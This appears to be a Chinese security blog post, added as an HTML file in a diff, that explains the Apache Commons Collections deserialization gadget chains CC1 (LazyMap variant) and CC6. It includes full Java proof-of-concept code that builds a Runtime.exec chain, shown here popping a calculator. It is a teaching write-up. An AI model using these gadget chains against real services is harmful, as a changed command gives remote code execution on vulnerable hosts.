@@ -1,0 +1,397 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java反序列化（3）—— CC链6 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java反序列化（3）—— CC链6 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="写在前面
+这个CommonsCollections的反序列化链被命名为1-7，其实是因为ysoserial这个工具中这么写的，并没有特殊的含义。
+
+而这个工具中，它的CC1和前面说的有那么一点点区别
+
+首先，之前定义的ChainedTran..." />
+    <meta name="keywords" content="漏洞分析,Java反序列化,JAVA" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java反序列化（3）—— CC链6
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-10
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/XzhG4n-u0/" class="post-tag">
+                  # 漏洞分析
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-fan-xu-lie-hua-3-cc-lian-6.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="写在前面">写在前面</h1>
+<p>这个CommonsCollections的反序列化链被命名为1-7，其实是因为<a href="https://github.com/frohoff/ysoserial/">ysoserial</a>这个工具中这么写的，并没有特殊的含义。<br>
+<img src="https://skyblu3519.github.io/post-images/1696952287195.png" alt="" loading="lazy"></p>
+<p>而这个工具中，它的CC1和前面说的有那么一点点区别<br>
+<img src="https://skyblu3519.github.io/post-images/1696952296112.png" alt="" loading="lazy"></p>
+<p>首先，之前定义的ChainedTransformer并没有改变，最后都是调用到ChainedTransformer.transform()。</p>
+<p>变的是调用ChainedTransformer.transform()的地方，之前用的是TransformedMap.checkSetValue()。但其实LazyMap.get()也调用了它。<br>
+<img src="https://skyblu3519.github.io/post-images/1696952304519.png" alt="" loading="lazy"></p>
+<p>首先了解下LazyMap的使用，它接受一个Map和一个Transformer对象来创建，并在get中调用factory（也就是传入的Transformer对象）的transform方法。</p>
+<pre><code class="language-java">Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);
+lazyMap.get(&quot;skky&quot;);
+</code></pre>
+<p>下面就是如何利用它。</p>
+<h1 id="cc1补充">CC1补充</h1>
+<p>利用点就在AnnotationInvocationHandler.invoke中<br>
+<img src="https://skyblu3519.github.io/post-images/1696952320195.png" alt="" loading="lazy"></p>
+<p>AnnotationInvocationHandler是一个动态代理类，也就是说调用它代理对象的任何方法都会走到这里来。只要它调用的方法是一个无参方法，同时这个方法不是toString、hashCode、annotationType就行。</p>
+<p>测试一下：</p>
+<pre><code class="language-java">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+// 创建一个lazyMap的InvocationHandler
+InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+Map mProxy = (Map) Proxy.newProxyInstance(
+        lazyMap.getClass().getClassLoader(),
+        new Class[]{Map.class},
+        invocationHandler
+);      // 创建一个动态代理类，代理lazyMap
+
+mProxy.size();  // 调用任何方法，都会执行到lazyMap.get
+</code></pre>
+<p>ok，现在我们就有一个Map对象了，随便调用这个对象的一个无参方法都可以达到我们想到的效果。现在就找一个满足条件的readObject作为入口。</p>
+<p>好巧不巧，还是AnnotationInvocationHandler<br>
+<img src="https://skyblu3519.github.io/post-images/1696952337232.png" alt="" loading="lazy"></p>
+<p>用刚刚反射出来的构造函数再创建一个AnnotationInvocationHandler，传入我们的动态代理类</p>
+<pre><code class="language-java">Object o = constructor.newInstance(Override.class, mProxy);
+
+serialize(o);
+unserialize(&quot;ser.bin&quot;);
+</code></pre>
+<p>完整代码</p>
+<pre><code class="language-java">package CC1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1Re {
+    public static void main(String[] args) throws Exception{
+        String cmd = &quot;open -a Calculator&quot;;
+        Class rc = Runtime.class;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(rc),
+                new InvokerTransformer(
+                        &quot;getMethod&quot;,
+                        new Class[]{String.class, Class[].class},
+                        new Object[]{&quot;getRuntime&quot;, null}
+                ),
+                new InvokerTransformer(
+                        &quot;invoke&quot;,
+                        new Class[]{Object.class, Object[].class},
+                        new Object[]{null, null}
+                ),
+                new InvokerTransformer(
+                        &quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{cmd}
+                )
+        });
+
+        Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);
+//        lazyMap.get(&quot;skky&quot;);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        // 创建一个lazyMap的InvocationHandler
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+        Map mProxy = (Map) Proxy.newProxyInstance(
+                lazyMap.getClass().getClassLoader(),
+                new Class[]{Map.class},
+                invocationHandler
+        );      // 创建一个动态代理类，代理lazyMap
+
+        Object o = constructor.newInstance(Override.class, mProxy);
+
+//        serialize(o);
+        unserialize(&quot;ser.bin&quot;);
+
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+    public static void serialize(Object obj) throws IOException{
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+}
+
+</code></pre>
+<h1 id="cc6">CC6</h1>
+<p>同样是用LazyMap.get()，不过调用点换成了TiedMapEntry.getValue()<br>
+<img src="https://skyblu3519.github.io/post-images/1696952360480.png" alt="" loading="lazy"></p>
+<p>看看TiedMapEntry是什么个事儿，调用点在getValue()<br>
+<img src="https://skyblu3519.github.io/post-images/1696952368559.png" alt="" loading="lazy"></p>
+<p>它自身的hashCode调用了getValue<br>
+<img src="https://skyblu3519.github.io/post-images/1696952376854.png" alt="" loading="lazy"></p>
+<p>非常简单，测试一下：</p>
+<pre><code class="language-java">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
+tiedMapEntry.hashCode();
+</code></pre>
+<p>和URL DNS链一样，我们用HashMap来作为入口类。</p>
+<pre><code class="language-java">HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;();
+hMap.put(tiedMapEntry, null);
+
+serialize(hMap);
+unserialize(&quot;ser.bin&quot;);
+</code></pre>
+<p>还是和URL DNS链一样，它的问题是执行put的时候，会调用一次<code>tiedMapEntry.hashCode();</code>。虽然不会影响反序列化的结果，但如果想要消除它的话。可以在put前将tiedMapEntry的map换成一个空的，之后在用反射改为lazyMap</p>
+<p>完整代码</p>
+<pre><code class="language-java">package CC6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6 {
+    public static void main(String[] args) throws Exception{
+        String cmd = &quot;open -a Calculator&quot;;
+        Class rc = Runtime.class;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(rc),
+                new InvokerTransformer(
+                        &quot;getMethod&quot;,
+                        new Class[]{String.class, Class[].class},
+                        new Object[]{&quot;getRuntime&quot;, null}
+                ),
+                new InvokerTransformer(
+                        &quot;invoke&quot;,
+                        new Class[]{Object.class, Object[].class},
+                        new Object[]{null, null}
+                ),
+                new InvokerTransformer(
+                        &quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{cmd}
+                )
+        });
+
+        Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap&lt;&gt;(), null);    // 用一个空的HashMap初始化
+//        tiedMapEntry.hashCode();
+
+        HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;();
+        hMap.put(tiedMapEntry, null);
+
+        // 反射修改tiedMapEntry
+        Class c =tiedMapEntry.getClass();
+        Field mapField = c.getDeclaredField(&quot;map&quot;);
+        mapField.setAccessible(true);
+        mapField.set(tiedMapEntry, lazyMap);
+
+//        serialize(hMap);
+        unserialize(&quot;ser.bin&quot;);
+
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+    public static void serialize(Object obj) throws IOException{
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li>
+<li><a href="#cc1%E8%A1%A5%E5%85%85">CC1补充</a></li>
+<li><a href="#cc6">CC6</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-fan-xu-lie-hua-2-cc-lian-1/">
+              <h3 class="post-title">
+                Java反序列化（2）——CC链1
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
